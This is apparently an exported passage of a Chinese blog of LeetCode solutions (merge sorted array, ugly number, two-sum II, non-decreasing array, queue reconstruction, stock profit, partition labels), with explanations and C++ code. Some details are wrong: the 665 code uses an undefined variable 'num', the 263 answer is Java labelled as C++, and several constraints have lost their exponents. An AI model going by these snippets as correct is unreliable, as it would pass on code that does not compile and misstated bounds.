&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


]]></content>
  </entry>
  <entry>
    <title>Leetcode 88. 合并两个有序数组</title>
    <url>/2021/04/11/Leetcode-88-%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h4 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="88. 合并两个有序数组"></a><a href="https://leetcode-cn.com/problems/merge-sorted-array/">88. 合并两个有序数组</a></h4><a id="more"></a>


<p>给你两个有序整数数组 <code>nums1</code> 和 <code>nums2</code>，请你将 <code>nums2</code> 合并到 <code>nums1</code> 中<em>，</em>使 <code>nums1</code> 成为一个有序数组。</p>
<p>初始化 <code>nums1</code> 和 <code>nums2</code> 的元素数量分别为 <code>m</code> 和 <code>n</code> 。你可以假设 <code>nums1</code> 的空间大小等于 <code>m + n</code>，这样它就有足够的空间保存来自 <code>nums2</code> 的元素。</p>
<p><strong>示例 1：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：nums1 &#x3D; [1,2,3,0,0,0], m &#x3D; 3, nums2 &#x3D; [2,5,6], n &#x3D; 3
输出：[1,2,2,3,5,6]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：nums1 &#x3D; [1], m &#x3D; 1, nums2 &#x3D; [], n &#x3D; 0
输出：[1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>nums1.length == m + n</code></li>
<li><code>nums2.length == n</code></li>
<li><code>0 &lt;= m, n &lt;= 200</code></li>
<li><code>1 &lt;= m + n &lt;= 200</code></li>
<li><code>-109 &lt;= nums1[i], nums2[i] &lt;= 109</code></li>
</ul>
<blockquote>
<ul>
<li>题解<br>因为这两个数组已经排好序，我们可以把两个指针分别放在两个数组的末尾，即 nums1 的<br>m − 1 位和 nums2 的 n − 1 位。每次将较大的那个数字复制到 nums1 的后边，然后向前移动一位。<br>因为我们也要定位 nums1 的末尾，所以我们还需要第三个指针，以便复制。<br>在以下的代码里，我们直接利用 m 和 n 当作两个数组的指针，再额外创立一个 pos 指针，起<br>始位置为 m + n − 1。每次向前移动 m 或 n 的时候，也要向前移动 pos。这里需要注意，如果 nums1<br>的数字已经复制完，不要忘记把 nums2 的数字继续复制；如果 nums2 的数字已经复制完，剩余<br>nums1 的数字不需要改变，因为它们已经被排好序。<br> 注意 这里我们使用了 ++ 和–的小技巧：a++ 和 ++a 都是将 a 加 1，但是 a++ 返回值为 a，而<br>++a 返回值为 a+1。如果只是希望增加 a 的值，而不需要返回值，则推荐使用 ++a，其运行速度<br>会略快一些。</li>
</ul>
</blockquote>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) 
	&#123;
		int mn&#x3D;m-- +  n-- -1;
		while(m&gt;&#x3D;0 &amp;&amp; n&gt;&#x3D;0)
			nums1[mn--]&#x3D;nums1[m]&gt;nums2[n]?nums1[m--]:nums2[n--];
		while(n&gt;&#x3D;0)
			nums1[mn--]&#x3D;nums2[n--];
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



]]></content>
  </entry>
  <entry>
    <title>Leetcode 263. 丑数</title>
    <url>/2021/04/11/Leetcode-263-%E4%B8%91%E6%95%B0/</url>
    <content><![CDATA[<h4 id="263-丑数"><a href="#263-丑数" class="headerlink" title="263. 丑数"></a><a href="https://leetcode-cn.com/problems/ugly-number/">263. 丑数</a></h4><a id="more"></a>

<p>给你一个整数 <code>n</code> ，请你判断 <code>n</code> 是否为 <strong>丑数</strong> 。如果是，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><strong>丑数</strong> 就是只包含质因数 <code>2</code>、<code>3</code> 和/或 <code>5</code> 的正整数。</p>
<p><strong>示例 1：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：n &#x3D; 6
输出：true
解释：6 &#x3D; 2 × 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：n &#x3D; 8
输出：true
解释：8 &#x3D; 2 × 2 × 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 3：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：n &#x3D; 14
输出：false
解释：14 不是丑数，因为它包含了另外一个质因数 7 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 4：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：n &#x3D; 1
输出：true
解释：1 通常被视为丑数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>-231 &lt;= n &lt;= 231 - 1</code></li>
</ul>
<blockquote>
<p> 方法一：数学<br>根据丑数的定义，0 和负整数一定不是丑数。</p>
</blockquote>
<blockquote>
<p>判断 n 是否满足上述形式，可以对 n反复除以 2,3,5，直到 n 不再包含质因数 2,3,5。若剩下的数等于 1，则说明 n 不包含其他质因数，是丑数；否则，说明 n 包含其他质因数，不是丑数。</p>
</blockquote>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
    public boolean isUgly(int n) &#123;
        if (n &lt;&#x3D; 0) &#123;
            return false;
        &#125;
        int[] factors &#x3D; &#123;2, 3, 5&#125;;
        for (int factor : factors) &#123;
            while (n % factor &#x3D;&#x3D; 0) &#123;
                n &#x2F;&#x3D; factor;
            &#125;
        &#125;
        return n &#x3D;&#x3D; 1;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<ul>
<li>复杂度分析</li>
</ul>
<blockquote>
<p>时间复杂度：O(logn)。时间复杂度取决于对 n 除以 2,3,52,3,5 的次数，由于每次至少将 n 除以 2，因此除法运算的次数不会超过 O(logn)。</p>
</blockquote>
<ul>
<li>空间复杂度：O(1)。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Leetcode 167. 两数之和 II - 输入有序数组</title>
    <url>/2021/04/11/Leetcode-167-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C-II-%E8%BE%93%E5%85%A5%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h4 id="167-两数之和-II-输入有序数组"><a href="#167-两数之和-II-输入有序数组" class="headerlink" title="167. 两数之和 II - 输入有序数组"></a><a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/">167. 两数之和 II - 输入有序数组</a></h4><a id="more"></a>

<p>给定一个已按照 <strong>升序排列</strong> 的整数数组 <code>numbers</code> ，请你从数组中找出两个数满足相加之和等于目标数 <code>target</code> 。</p>
<p>函数应该以长度为 <code>2</code> 的整数数组的形式返回这两个数的下标值<em>。</em><code>numbers</code> 的下标 <strong>从 1 开始计数</strong> ，所以答案数组应当满足 <code>1 &lt;= answer[0] &lt; answer[1] &lt;= numbers.length</code> 。</p>
<p>你可以假设每个输入只对应唯一的答案，而且你不可以重复使用相同的元素。</p>
<p><strong>示例 1：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：numbers &#x3D; [2,7,11,15], target &#x3D; 9
输出：[1,2]
解释：2 与 7 之和等于目标数 9 。因此 index1 &#x3D; 1, index2 &#x3D; 2 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：numbers &#x3D; [2,3,4], target &#x3D; 6
输出：[1,3]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>示例 3：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：numbers &#x3D; [-1,0], target &#x3D; -1
输出：[1,2]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= numbers.length &lt;= 3 * 104</code></li>
<li><code>-1000 &lt;= numbers[i] &lt;= 1000</code></li>
<li><code>numbers</code> 按 <strong>递增顺序</strong> 排列</li>
<li><code>-1000 &lt;= target &lt;= 1000</code></li>
<li>仅存在一个有效答案</li>
</ul>
<blockquote>
<p>解题思路：<br>很多人做这个题目想不到正确的 O(n)O(n) 解法，即使看了答案理解了，下次再做的时候还是会忘记。要想真正理解这道题，就要明白解法背后的道理。这样不仅可以记住这道题，还能举一反三解决类似的题目。</p>
</blockquote>
<blockquote>
<p>很多题解只给出了双指针解法的代码，但没有说明解法的正确性。为什么双指针往中间移动时，不会漏掉某些情况呢？要解答这个问题，我们要从缩减搜索空间的角度思考这个解法。下面我将以文字和图片两种方式进行讲解。</p>
</blockquote>
<p>需要注意的是，虽然本题叫做 Two Sum II，但解法和 Two Sum 完全不同。</p>
<p>图解双指针解法的原理<br>在这道题中，我们要寻找的是符合条件的一对下标 (i, j)它们需要满足的约束条件是：</p>
<p>i、j 都是合法的下标，即<strong>0 &lt;= i &lt; n, 0 &lt;= j &lt; n</strong><br><strong>i &lt;j</strong>（题目要求）<br>而我们希望从中找到满足<strong>A[i] + A[j] == target **的下标 **(i,j)**。以 **n = 8</strong> 为例，这时候全部的搜索空间是：</p>
<p><img src="https://i.loli.net/2021/04/11/tBLXEcKzTgVwYlM.jpg" alt="下标 i, j 的搜索空间"></p>
<p>假设此时 A[0] + A[7] 小于 target。这时候，我们应该去找和更大的两个数。由于 A[7] 已经是最大的数了，其他的数跟 A[0] 相加，和只会更小。也就是说 A[0] + A[6] 、A[0] + A[5]、……、A[0] + A[1] 也都小于 target，这些都是不合要求的解，可以一次排除。这相当于 i=0i=0 的情况全部被排除。对应用双指针解法的代码，就是 i++，对应于搜索空间，就是削减了一行的搜索空间，如下图所示。</p>
<p><img src="https://i.loli.net/2021/04/11/hKTl7ZV9d5RYmH4.jpg" alt="检查单元格 0, 7"></p>
<p>排除掉了搜索空间中的一行之后，我们再看剩余的搜索空间，仍然是倒三角形状。我们检查右上方的单元格 (1, 7)(1,7)，计算 A[1] + A[7] 与 target 进行比较。</p>
<p>假设此时 A[0] + A[7] 大于 target。这时候，我们应该去找和更小的两个数。由于 A[1] 已经是当前搜索空间最小的数了，其他的数跟 A[7] 相加的话，和只会更大。也就是说 A[1] + A[7] 、A[2] + A[7]、……、A[6] + A[7] 也都大于 target，这些都是不合要求的解，可以一次排除。这相当于 j=0j=0 的情况全部被排除。对应用双指针解法的代码，就是 j++，对应于搜索空间，就是削减了一列的搜索空间，如下图所示。</p>
<p><img src="https://i.loli.net/2021/04/11/ia4YOvS5k6tKwmT.jpg" alt="排除 i = 0 的全部解"></p>
<p>可以看到，无论 A[i] + A[j] 的结果是大了还是小了，我们都可以排除掉一行或者一列的搜索空间。经过 nn 步以后，就能排除所有的搜索空间，检查完所有的可能性。搜索空间的减小过程如下面动图所示：</p>
<p><img src="https://i.loli.net/2021/04/11/bAFoYEIvVDSpNJi.jpg" alt="检查单元格 1, 7"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&gt; 题解
因为数组已经排好序，我们可以采用方向相反的双指针来寻找这两个数字，一个初始指向最
小的元素，即数组最左边，向右遍历；一个初始指向最大的元素，即数组最右边，向左遍历。
如果两个指针指向元素的和等于给定值，那么它们就是我们要的结果。如果两个指针指向元
素的和小于给定值，我们把左边的指针右移一位，使得当前的和增加一点。如果两个指针指向元
素的和大于给定值，我们把右边的指针左移一位，使得当前的和减少一点。
可以证明，对于排好序且有解的数组，双指针一定能遍历到最优解。证明方法如下：假设最
优解的两个数的位置分别是 l 和 r。我们假设在左指针在 l 左边的时候，右指针已经移动到了 r；
此时两个指针指向值的和小于给定值，因此左指针会一直右移直到到达 l。同理，如果我们假设
在右指针在 r 右边的时候，左指针已经移动到了 l；此时两个指针指向值的和大于给定值，因此
右指针会一直左移直到到达 r。所以双指针在任何时候都不可能处于 (l,r) 之间，又因为不满足条
件时指针必须移动一个，所以最终一定会收敛在 l 和 r。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; num, int t) 
	&#123;
		int n&#x3D;num.size();
		int l&#x3D;0,r&#x3D;n-1;
		for(int i&#x3D;0;i&lt;n;++i)
		&#123;
			int sum&#x3D;num[l]+num[r];
			if(t&#x3D;&#x3D;sum) break;
			if(t&gt;sum) ++l;
			else --r;
		&#125;
		return vector&lt;int&gt; &#123;l+1,r+1&#125;;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 665. 非递减数列</title>
    <url>/2021/04/11/Leetcode-665-%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/</url>
    <content><![CDATA[<h4 id="665-非递减数列"><a href="#665-非递减数列" class="headerlink" title="665. 非递减数列"></a><a href="https://leetcode-cn.com/problems/non-decreasing-array/">665. 非递减数列</a></h4><a id="more"></a>

<p>给你一个长度为 <code>n</code> 的整数数组，请你判断在 <strong>最多</strong> 改变 <code>1</code> 个元素的情况下，该数组能否变成一个非递减数列。</p>
<p>我们是这样定义一个非递减数列的： 对于数组中任意的 <code>i</code> <code>(0 &lt;= i &lt;= n-2)</code>，总满足 <code>nums[i] &lt;= nums[i + 1]</code>。</p>
<p><strong>示例 1:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: nums &#x3D; [4,2,3]
输出: true
解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: nums &#x3D; [4,2,1]
输出: false
解释: 你不能在只改变一个元素的情况下将其变为非递减数列。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 10 ^ 4</code></li>
<li><code>- 10 ^ 5 &lt;= nums[i] &lt;= 10 ^ 5</code></li>
</ul>
<p>二、举例分析<br>首先，看下面的几个测试用例，它们都因为数字 2 的出现，导致数组是非单调递增的。</p>
<p>例①： 4, 2, 5<br>例②： 1, 4, 2, 5<br>例③： 3, 4, 2, 5<br>当数组中出现 2 时，破坏了数组的单调递增。为了让数组有序，我们需要对 2 或者 4 进行调整：</p>
<p>第①个用例，我们可以 把 4 调小到 &lt;= 2  或者 把 2 调大到 4、5 ，使数组有序。</p>
<p><img src="https://i.loli.net/2021/04/11/3SVXcZ1WreYzU8m.gif" alt="655-1.gif"></p>
<p>第②个用例，我们可以 把 4 调小到 1、2  或者 把 2 调大到 4、5 ，使数组有序。</p>
<p><img src="https://i.loli.net/2021/04/11/3SVXcZ1WreYzU8m.gif"></p>
<p>第③个用例，我们必须 把 2 调大到 4、5，才能使数组有序：我们不能把 4 调整为一个 &lt;= 2 的数字，因为 4 前面的元素是 3.</p>
<p><img src="https://i.loli.net/2021/04/11/POs68CYBFp7Kjvq.gif" alt="655-3.gif"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    bool checkPossibility(vector&lt;int&gt;&amp; nums) 
	&#123;
		int n&#x3D;nums.size();
		
		int cnt&#x3D;0;
		for(int i&#x3D;0;i&lt;n-1;++i)
		&#123;
			if(nums[i] &gt;num[i+1])
			&#123;
				++cnt;
				if(cnt&gt;1) return false;
				if(i&gt;0 &amp;&amp; nums[i+1] &lt;nums[i-1])
					nums[i+1]&#x3D;num[i];
			&#125;
		&#125;
		return true;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 406. 根据身高重建队列</title>
    <url>/2021/04/11/Leetcode-406-%E6%A0%B9%E6%8D%AE%E8%BA%AB%E9%AB%98%E9%87%8D%E5%BB%BA%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<p>假设有打乱顺序的一群人站成一个队列，数组 <code>people</code> 表示队列中一些人的属性（不一定按顺序）。每个 <code>people[i] = [hi, ki]</code> 表示第 <code>i</code> 个人的身高为 <code>hi</code> ，前面 <strong>正好</strong> 有 <code>ki</code> 个身高大于或等于 <code>hi</code> 的人。</p>
<a id="more"></a>
<h4 id="406-根据身高重建队列"><a href="#406-根据身高重建队列" class="headerlink" title="406. 根据身高重建队列"></a><a href="https://leetcode-cn.com/problems/queue-reconstruction-by-height/">406. 根据身高重建队列</a></h4><p>请你重新构造并返回输入数组 <code>people</code> 所表示的队列。返回的队列应该格式化为数组 <code>queue</code> ，其中 <code>queue[j] = [hj, kj]</code> 是队列中第 <code>j</code> 个人的属性（<code>queue[0]</code> 是排在队列前面的人）。</p>
<p><strong>示例 1：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：people &#x3D; [[7,0],[4,4],[7,1],[5,0],[6,1],[5,2]]
输出：[[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]]
解释：
编号为 0 的人身高为 5 ，没有身高更高或者相同的人排在他前面。
编号为 1 的人身高为 7 ，没有身高更高或者相同的人排在他前面。
编号为 2 的人身高为 5 ，有 2 个身高更高或者相同的人排在他前面，即编号为 0 和 1 的人。
编号为 3 的人身高为 6 ，有 1 个身高更高或者相同的人排在他前面，即编号为 1 的人。
编号为 4 的人身高为 4 ，有 4 个身高更高或者相同的人排在他前面，即编号为 0、1、2、3 的人。
编号为 5 的人身高为 7 ，有 1 个身高更高或者相同的人排在他前面，即编号为 1 的人。
因此 [[5,0],[7,0],[5,2],[6,1],[4,4],[7,1]] 是重新构造后的队列。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：people &#x3D; [[6,0],[5,0],[4,0],[3,2],[2,2],[1,4]]
输出：[[4,0],[5,0],[2,2],[3,2],[1,4],[6,0]]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= people.length &lt;= 2000</code></li>
<li><code>0 &lt;= hi &lt;= 106</code></li>
<li><code>0 &lt;= ki &lt; people.length</code></li>
<li>题目数据确保队列可以被重建</li>
</ul>
<p>解题思路<br>题目描述：整数对 (h, k) 表示，其中 h 是这个人的身高，k 是排在这个人前面且身高大于或等于 h 的人数。</p>
<ul>
<li><p>渔（套路）：一般这种数对，还涉及排序的，根据第一个元素正向排序，根据第二个元素反向排序，或者根据第一个元素反向排序，根据第二个元素正向排序，往往能够简化解题过程。</p>
</li>
<li><p>在本题目中，我首先对数对进行排序，按照数对的元素 1 降序排序，按照数对的元素 2 升序排序。原因是，按照元素 1 进行降序排序，对于每个元素，在其之前的元素的个数，就是大于等于他的元素的数量，而按照第二个元素正向排序，我们希望 k 大的尽量在后面，减少插入操作的次数。</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/04/11/8PFdngKrvX3Eym5.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/uG18sOa4geyr76q.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/62l7HP4hUmDLR8Z.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/AU2y3MXkl7BqLxd.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/JwBqVhltdTa1pyC.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/04/11/JwBqVhltdTa1pyC.png"></p>
<p><img src="https://i.loli.net/2021/04/11/JwBqVhltdTa1pyC.png"></p>
<p><img src="https://i.loli.net/2021/04/11/JwBqVhltdTa1pyC.png"></p>
<p><img src="https://i.loli.net/2021/04/11/54bcqGL7NSyavjT.png" alt="img"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    vector&lt;vector&lt;int&gt;&gt; reconstructQueue(vector&lt;vector&lt;int&gt;&gt;&amp; p) 
    &#123;
        sort(p.begin(),p.end(),[](vector&lt;int&gt; &amp;a,vector&lt;int&gt; &amp;b)
		&#123;
			return a[0]&gt;b[0] ||(a[0]&#x3D;&#x3D;b[0] &amp;&amp; a[1] &lt;b[1]);
		&#125;);
		vector&lt;vector&lt;int&gt; &gt; _return ;
		for(int i&#x3D;0;i&lt;p.size();++i)
		&#123;
			_return.insert(_return.begin() +p[i][1],p[i]);
		&#125;
		return _return;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 122. 买卖股票的最佳时机 II</title>
    <url>/2021/04/11/Leetcode-122-%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA-II/</url>
    <content><![CDATA[<p>给定一个数组，它的第 <em>i</em> 个元素是一支给定股票第 <em>i</em> 天的价格。</p>
<a id="more"></a>

<h4 id="122-买卖股票的最佳时机-II"><a href="#122-买卖股票的最佳时机-II" class="headerlink" title="122. 买卖股票的最佳时机 II"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/">122. 买卖股票的最佳时机 II</a></h4><p>给定一个数组，它的第 <em>i</em> 个元素是一支给定股票第 <em>i</em> 天的价格。</p>
<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>
<p><strong>注意：</strong>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
<p><strong>示例 1:</strong></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">输入: [7,1,5,3,6,4]
输出: 7
解释: 在第 2 天（股票价格 &#x3D; 1）的时候买入，在第 3 天（股票价格 &#x3D; 5）的时候卖出, 这笔交易所能获得利润 &#x3D; 5-1 &#x3D; 4 。
     随后，在第 4 天（股票价格 &#x3D; 3）的时候买入，在第 5 天（股票价格 &#x3D; 6）的时候卖出, 这笔交易所能获得利润 &#x3D; 6-3 &#x3D; 3 。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2:</strong></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">输入: [1,2,3,4,5]
输出: 4
解释: 在第 1 天（股票价格 &#x3D; 1）的时候买入，在第 5 天 （股票价格 &#x3D; 5）的时候卖出, 这笔交易所能获得利润 &#x3D; 5-1 &#x3D; 4 。
     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。
     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 3:</strong></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">输入: [7,6,4,3,1]
输出: 0
解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= prices.length &lt;= 3 * 10 ^ 4</code></li>
<li><code>0 &lt;= prices[i] &lt;= 10 ^ 4</code></li>
</ul>
<blockquote>
<p>需要说明的是，贪心算法只能用于计算最大利润，<strong>计算的过程并不是实际的交易过程</strong>。</p>
</blockquote>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    int maxProfit(vector&lt;int&gt;&amp; prices) &#123;   
        int ans &#x3D; 0;
        int n &#x3D; prices.size();
        for (int i &#x3D; 1; i &lt; n; ++i) &#123;
            ans +&#x3D; max(0, prices[i] - prices[i - 1]);
        &#125;
        return ans;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<p>复杂度分析</p>
<p>时间复杂度：O(n)，其中 n 为数组的长度。我们只需要遍历一次数组即可。</p>
<p>空间复杂度：O(1)。只需要常数空间存放若干变量。</p>
]]></content>
  </entry>
  <entry>
    <title>Leetcode 763. 划分字母区间</title>
    <url>/2021/04/11/Leetcode-763-%E5%88%92%E5%88%86%E5%AD%97%E6%AF%8D%E5%8C%BA%E9%97%B4/</url>
    <content><![CDATA[<p>字符串 <code>S</code> 由小写字母组成。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。返回一个表示每个字符串片段的长度的列表。</p>
<a id="more"></a>
<h4 id="763-划分字母区间"><a href="#763-划分字母区间" class="headerlink" title="763. 划分字母区间"></a><a href="https://leetcode-cn.com/problems/partition-labels/">763. 划分字母区间</a></h4><p>字符串 <code>S</code> 由小写字母组成。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。返回一个表示每个字符串片段的长度的列表。</p>
<p><strong>示例：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：S &#x3D; &quot;ababcbacadefegdehijhklij&quot;
输出：[9,7,8]
解释：
划分结果为 &quot;ababcbaca&quot;, &quot;defegde&quot;, &quot;hijhklij&quot;。
每个字母最多出现在一个片段中。
像 &quot;ababcbacadefegde&quot;, &quot;hijhklij&quot; 的划分是错误的，因为划分的片段数较少。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>S</code>的长度在<code>[1, 500]</code>之间。</li>
<li><code>S</code>只包含小写字母 <code>&#39;a&#39;</code> 到 <code>&#39;z&#39;</code> 。</li>
</ul>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    vector&lt;int&gt; partitionLabels(string s) 
	&#123;
		int n&#x3D;s.size();
		int alphbet[26];
		for(int i&#x3D;0;i&lt;n;++i)
		&#123;
			alphbet[s[i]-&#39;a&#39;]&#x3D;i;
		&#125;
		vector&lt;int&gt; _return ;
		int l&#x3D;0,r&#x3D;0,cnt&#x3D;0;
		for(int i&#x3D;0;i&lt;n;++i)
		&#123;
			r&#x3D;max(r,alphbet[s[i]-&#39;a&#39;]);
			if(i&#x3D;&#x3D;r) 
			&#123;
				_return.push_back(r-l+1);
				l&#x3D;r+1;
			&#125;
		&#125;
		return _return;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>一想到分割字符串就想到了回溯，但本题其实不用回溯去暴力搜索。</p>
</blockquote>
<ul>
<li><p>题目要求同一字母最多出现在一个片段中，那么如何把同一个字母的都圈在同一个区间里呢？</p>
</li>
<li><p>如果没有接触过这种题目的话，还挺有难度的。</p>
</li>
</ul>
<p>在遍历的过程中相当于是要找每一个字母的边界，如果找到之前遍历过的所有字母的最远边界，说明这个边界就是分割点了。此时前面出现过所有字母，最远也就到这个边界了。</p>
<blockquote>
<p>可以分为如下两步：</p>
</blockquote>
<ul>
<li>统计每一个字符最后出现的位置</li>
<li>从头遍历字符，并更新字符的最远出现下标，如果找到字符最远出现位置下标和当前下标相等了，则找到了分割点<br>如图：</li>
</ul>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    vector&lt;int&gt; partitionLabels(string S) &#123;
        int hash[27] &#x3D; &#123;0&#125;; &#x2F;&#x2F; i为字符，hash[i]为字符出现的最后位置
        for (int i &#x3D; 0; i &lt; S.size(); i++) &#123; &#x2F;&#x2F; 统计每一个字符最后出现的位置
            hash[S[i] - &#39;a&#39;] &#x3D; i;
        &#125;
        vector&lt;int&gt; result;
        int left &#x3D; 0;
        int right &#x3D; 0;
        for (int i &#x3D; 0; i &lt; S.size(); i++) &#123;
            right &#x3D; max(right, hash[S[i] - &#39;a&#39;]); &#x2F;&#x2F; 找到字符出现的最远边界
            if (i &#x3D;&#x3D; right) &#123;
                result.push_back(right - left + 1);
                left &#x3D; i + 1;
            &#125;
        &#125;
        return result;
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

